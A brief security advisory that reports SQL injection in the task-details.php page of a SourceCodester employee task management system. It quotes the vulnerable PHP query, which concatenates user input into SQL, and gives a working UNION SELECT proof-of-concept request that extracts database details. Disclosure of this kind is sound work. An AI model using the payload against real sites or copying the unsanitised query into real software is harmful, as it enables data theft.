# SOURCECODESTER / Employee Task Management System - SQL Injection task-details.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)

## Vendor Homepage:
> https://www.sourcecodester.com/php/17217/employee-management-system-php-and-mysql-free-download.html

## Affected Component
> /task-details.php

## Code
```php
$sql = "SELECT a.*, b.fullname 
FROM task_info a
LEFT JOIN tbl_admin b ON(a.t_user_id = b.user_id)
WHERE task_id='$task_id'";
$info = $obj_admin->manage_all_info($sql);
$row = $info->fetch(PDO::FETCH_ASSOC);
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /task-details.php?task_id='+union+select+1,concat('Database+Name%3a+',+database()),concat('Database+Version%3a+',version()),concat('Database+User%3a+',user()),5,6,7,8+--+- HTTP/1.1
Host: 127.0.0.1
Research-By: NoChizPlz
```

## Screenshot
![img.png](SQL%20Injection%20-%20task-details%2Fimg.png)


